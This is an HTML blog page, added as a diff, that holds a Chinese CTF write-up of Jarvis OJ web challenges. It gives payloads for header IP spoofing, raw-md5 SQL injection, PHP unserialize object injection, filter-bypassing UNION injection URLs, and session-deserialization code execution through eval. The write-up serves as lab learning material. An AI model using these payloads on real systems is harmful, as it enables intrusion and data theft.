@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		 
+			
+  
+    <meta name="twitter:card" content="summary"/>
+    
+      <meta name="twitter:image" content="http://yang1k.github.io/images/avatar.png" />
+    
+  
+  
+  <meta name="twitter:title" content="Jarvis OJ 平台"/>
+  <meta name="twitter:description" content="考试终于结束了，离散做的爆炸。做点题缓一缓。
+"/>
+  
+  
+  
+  
+    <meta name="twitter:creator" content="@Yang1k"/>
+  
+
+
+
+		
+		<meta name="author" content="Yang1k">
+		<meta name="description" content="Site Description">
+		<meta name="generator" content="Hugo 0.56.0" />
+		<title>Jarvis OJ 平台 &middot; Yang1k</title>
+		<link rel="shortcut icon" href="http://yang1k.github.io/images/favicon.ico">
+		<link rel="stylesheet" href="http://yang1k.github.io/css/style.css">
+		<link rel="stylesheet" href="http://yang1k.github.io/css/highlight.css">
+
+		
+		<link rel="stylesheet" href="http://yang1k.github.io/css/font-awesome.min.css">
+		
+
+		
+		<link href="http://yang1k.github.io/index.xml" rel="alternate" type="application/rss+xml" title="Yang1k" />
+		
+
+		
+	</head>
+
+    <body>
+       <nav class="main-nav">
+	
+	
+		<a href='http://yang1k.github.io/'> <span class="arrow">←</span>Home</a>
+	
+	<a href='http://yang1k.github.io/post'>Archive</a>
+	<a href='http://yang1k.github.io/tags'>Tags</a>
+	<a href='http://yang1k.github.io/about'>About</a>
+
+	
+
+	
+	<a class="" href="http://yang1k.github.io/index.xml">RSS</a>
+	
+</nav>
+
+
+        <section id="wrapper" class="post">
+            <article>
+                <header>
+                    <h1>
+                        Jarvis OJ 平台
+                    </h1>
+                    <h2 class="headline">
+                    Jan 15, 2018 09:54
+                    · 357 words
+                    · 2 minute read
+                      <span class="tags">
+                      
+                      
+                          
+                              <a href="http://yang1k.github.io/tags/ctf">ctf</a>
+                          
+                              <a href="http://yang1k.github.io/tags/python">python</a>
+                          
+                      
+                      
+                      </span>
+                    </h2>
+                </header>
+                
+                  
+                    <div id="toc">
+                      <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#port51">PORT51</a></li>
+<li><a href="#localhost">Localhost</a></li>
+<li><a href="#login">login</a></li>
+<li><a href="#神盾局的秘密">神盾局的秘密</a></li>
+<li><a href="#in-a-mess">IN A Mess</a></li>
+<li><a href="#phpinfo-18-3-19">phpinfo(18-3-19)</a></li>
+</ul></li>
+</ul>
+</nav>
+                    </div>
+                  
+                
+                <section id="post-body">
+                    <p>考试终于结束了，离散做的爆炸。做点题缓一缓。
+<!-- more --></p>
+
+<h2 id="port51">PORT51</h2>
+
+<p>使用curl命令指定端口访问</p>
+
+<pre><code>curl --local-port 51 http://web.jarvisoj.com:32770/
+</code></pre>
+
+<pre><code>flag:PCTF{M45t3r_oF_CuRl}
+</code></pre>
+
+<h2 id="localhost">Localhost</h2>
+
+<p>提示：localhost access only!!
+只有本地用户才可以访问</p>
+
+<p>伪造IP，为127.0.0.1</p>
+
+<pre><code>X-Forwarded-For： 127.0.0.1
+</code></pre>
+
+<pre><code>PCTF{X_F0rw4rd_F0R_is_not_s3cuRe}
+</code></pre>
+
+<h2 id="login">login</h2>
+
+<p>打开链接是一个输入密码的form表单，抓包后发现hint如下</p>
+
+<pre><code>Hint: &quot;select * from `admin` where password='&quot;.md5($pass,true).&quot;'&quot;
+</code></pre>
+
+<p>看到在where语句后拼接了一个md5($pass,true)，第一次看到MD5函数的第二个参数，查看手册的解释如下</p>
+
+<pre><code>MD5（string md5  ( string $str  [, bool $raw_output  = false  ] )）
+str
+原始字符串。
+raw_output 
+如果可选的 raw_output 被设置为 TRUE ，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回。 
+</code></pre>
+
+<p>百度直接搜索md5($pass,true)，看到说简单来说就是 true将16进制的md5转化为字符了,如果某一字符串的md5恰好能够产生如’or ’之类的注入语句，就可以注入了。
+提供了字符串
+ffifdyop
+md5后，276f722736c95d99e921722cf9ed621c
+转成字符串后： &lsquo;or&rsquo;6<trash></p>
+
+<p>拿去提交得到flag</p>
+
+<pre><code>PCTF{R4w_md5_is_d4ng3rous}
+</code></pre>
+
+<h2 id="神盾局的秘密">神盾局的秘密</h2>
+
+<p>打开链接是一个图片，右键查看源代码，看到</p>
+
+<pre><code>&lt;img src=&quot;showimg.php?img=c2hpZWxkLmpwZw==&quot; width=&quot;100%&quot;/&gt;
+</code></pre>
+
+<p>然后去访问这个链接，出来的是一堆乱码。这是直接把jpg文件内容输出出来，猜测这里可以读文件，而且文件名是经过base64加密。
+尝试读取showimg.php文件</p>
+
+<pre><code>http://web.jarvisoj.com:32768/showimg.php?img=c2hvd2ltZy5waHA=
+</code></pre>
+
+<p>打开一片空白，右键查看源码，就看到了showimg.php的源码</p>
+
+<pre><code>&lt;?php
+	$f = $_GET['img'];
+	if (!empty($f)) {
+		$f = base64_decode($f);
+		if (stripos($f,'..')===FALSE &amp;&amp; stripos($f,'/')===FALSE &amp;&amp; stripos($f,'\\')===FALSE
+		&amp;&amp; stripos($f,'pctf')===FALSE) {
+			readfile($f);
+		} else {
+			echo &quot;File not found!&quot;;
+		}
+	}
+?&gt;
+
+</code></pre>
+
+<p>可以看到使用了readfile函数，而且限制了一个字符串pctf。
+同样的操作读取index.php，得到源码</p>
+
+<pre><code>&lt;?php 
+	require_once('shield.php');
+	$x = new Shield();
+	isset($_GET['class']) &amp;&amp; $g = $_GET['class'];
+	if (!empty($g)) {
+		$x = unserialize($g);
+	}
+	echo $x-&gt;readfile();
+?&gt;
+</code></pre>
+
+<p>这里又发现了一个shield.php，先读取下来。</p>
+
+<pre><code>&lt;?php
+	//flag is in pctf.php
+	class Shield {
+		public $file;
+		function __construct($filename = '') {
+			$this -&gt; file = $filename;
+		}
+		
+		function readfile() {
+			if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,'..')===FALSE  
+			&amp;&amp; stripos($this-&gt;file,'/')===FALSE &amp;&amp; stripos($this-&gt;file,'\\')==FALSE) {
+				return @file_get_contents($this-&gt;file);
+			}
+		}
+	}
+?&gt;
+</code></pre>
+
+<p>这里告诉了我们flag在pctf.php文件里，目标就是得到pctf.php的文件内容了。
+接下来看shield.php的代码。可以看到这个定义的类里有一个<strong>construct方法，这个方法可是触发反序列化漏洞。再去看index.php里，刚好就有一句\$x = unserialize($g);。之前做过一个关于</strong>string方法的反序列化漏洞的题。利用手法是一样的。
+构造参数的方法如下</p>
+
+<pre><code>&lt;?php
+class Shield{
+public $file;    
+}    
+$a = new Shield();  
+$a-&gt;file = &quot;pctf.php&quot;;  
+$a = serialize($a);  
+echo $a; 
+//输出O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}
+?&gt; 
+</code></pre>
+
+<p>最终的payload</p>
+
+<pre><code>http://web.jarvisoj.com:32768/index.php?class=O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}
+</code></pre>
+
+<pre><code>PCTF{W3lcome_To_Shi3ld_secret_Ar3a}
+</code></pre>
+
+<h2 id="in-a-mess">IN A Mess</h2>
+
+<p>右键发现index.phps，访问得到源码。
+关键代码</p>
+
+<pre><code>$data = @file_get_contents($a,'r');
+if($data==&quot;1112 is a nice lab!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)
+{
+	require(&quot;flag.txt&quot;);
+}
+</code></pre>
+
+<p>file_get_contents函数可以使用这样的写法file_get_contents(php://input)
+来绕过
+最终构造的参数</p>
+
+<pre><code>?id=ldkas&amp;a=php://input&amp;b=%00111111
+post数据：1112 is a nice lab!
+</code></pre>
+
+<p>得到了一个路径^HT2mCpcvOLf
+访问知道是一个注入。
+测试后得出的payload</p>
+
+<pre><code>爆表
+http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=-1/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(table_name)/*1*/frfromom/*1*/information_schema.tables/*1*/where/*1*/table_schema/*1*/=/*1*/database()#
+爆列
+http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=-1/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(column_name)/*1*/frfromom/*1*/information_schema.COLUMNS/*1*/where/*1*/table_schema=database()#
+爆内容
+http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=-1/*1*/ununionion/*1*/selselectect/*1*/1,2,context/*1*/frfromom/*1*/content#
+</code></pre>
+
+<p>在爆列名的时候不能使用where table_name=&lsquo;content&rsquo;，很奇怪，所以就使用database()来查。</p>
+
+<pre><code>PCTF{Fin4lly_U_got_i7_C0ngRatulation5}
+</code></pre>
+
+<h2 id="phpinfo-18-3-19">phpinfo(18-3-19)</h2>
+
+<p>源码</p>
+
+<pre><code>&lt;?php
+//A webshell is wait for you
+ini_set('session.serialize_handler', 'php');
+session_start();
+class OowoO
+{
+    public $mdzz;
+    function __construct()
+    {
+        $this-&gt;mdzz = 'phpinfo();';
+    }
+    
+    function __destruct()
+    {
+        eval($this-&gt;mdzz);
+    }
+}
+if(isset($_GET['phpinfo']))
+{
+    $m = new OowoO();
+}
+else
+{
+    highlight_string(file_get_contents('index.php'));
+}
+?&gt;
+</code></pre>
+
+<p>根据源码可以查看phpinfo，查看phpinfo后可以得到网站的根目录为/opt/lampp/htdocs。(大佬教育我phpinfo很重要，所以真的)</p>
+
+<p>还可以看到网站设置的默认的session存储方式为php_serialize。</p>
+
+<pre><code>| Directive 			| Local Value 	| Master Value |
+session.serialize_handler	php  		  php_serialize
+</code></pre>
+
+<p>再根据源代码的第一行ini_set(&lsquo;session.serialize_handler&rsquo;, &lsquo;php&rsquo;);将session的存储方式修改为php。
+这样的设置就会导致session存储差异引起的反序列化漏洞。
+<a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/">session反序列详解</a>
+但是代码里并没有可以控制的session变量，这里有一个小知识，就是利用php在上传文件的时候会将文件名存储到session的变量中。这个功能的实现的条件是将session.upload_progress.enabled设置为on。查看phpinfo的设置选项确实是on。
+于是自己构造一个文件上传的页面，上传到<a href="http://web.jarvisoj.com:32784/。">http://web.jarvisoj.com:32784/。</a></p>
+
+<p>文件上传代码</p>
+
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+	&lt;title&gt;&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+
+&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;
+    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;sdas&quot; /&gt;
+    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;
+    &lt;input type=&quot;submit&quot; /&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>构造序列化代码</p>
+
+<pre><code>&lt;?php
+class OowoO
+{
+    public $mdzz;
+    function __construct()
+    {
+        $this-&gt;mdzz = 'phpinfo();';
+    }
+    
+    function __destruct()
+    {
+        eval($this-&gt;mdzz);
+    }
+}
+$a = new OowoO();
+$a-&gt;mdzz='print_r(scandir(&quot;/opt/lampp/htdocs&quot;));';
+#$a-&gt;mdzz='print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;));';
+echo serialize($a);
+</code></pre>
+
+<p>这里用到一个scandir函数，这个函数是将目录下的文件名都打印出来。</p>
+
+<p>结果</p>
+
+<pre><code>|O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:38:\&quot;print_r(scandir(\&quot;/opt/lampp/htdocs\&quot;));\&quot;;} 
+</code></pre>
+
+<p>抓取文件上传的数据包将filename修改为序列化后的结果即可。
+flag</p>
+
+<pre><code>CTF{4d96e37f4be998c50aa586de4ada354a}
+</code></pre>
+                </section>
+            </article>
+
+            
+                <a class="twitter" href="https://twitter.com/intent/tweet?text=http%3a%2f%2fyang1k.github.io%2fpost%2fjarvis-oj%25E5%25B9%25B3%25E5%258F%25B0%2f - Jarvis%20OJ%20%e5%b9%b3%e5%8f%b0 "><span class="icon-twitter"> tweet</span></a>
+
+<a class="facebook" href="#" onclick="
+    window.open(
+      'https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(location.href),
+      'facebook-share-dialog',
+      'width=626,height=436');
+    return false;"><span class="icon-facebook-rect"> Share</span>
+</a>
+
+            
+
+            
+                <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'your_disqus_short_name'; 
+
+     
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+            
+
+            
+
+            <footer id="footer">
+    
+    <p class="small">
+    
+       © Copyright 2019 <i class="fa fa-heart" aria-hidden="true"></i> Yang1k
+    
+    </p>
+    <p class="small">
+        Powered by <a href="http://www.gohugo.io/">Hugo</a> Theme By <a href="https://github.com/nodejh/hugo-theme-cactus-plus">nodejh</a>
+    </p>
+</footer>
+
+        </section>
+
+        <script src="http://yang1k.github.io/js/jquery-3.3.1.min.js"></script>
+<script src="http://yang1k.github.io/js/main.js"></script>
+<script src="http://yang1k.github.io/js/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+
+
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'your_google_analytics_id', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+
+
+
+    </body>
+</html>
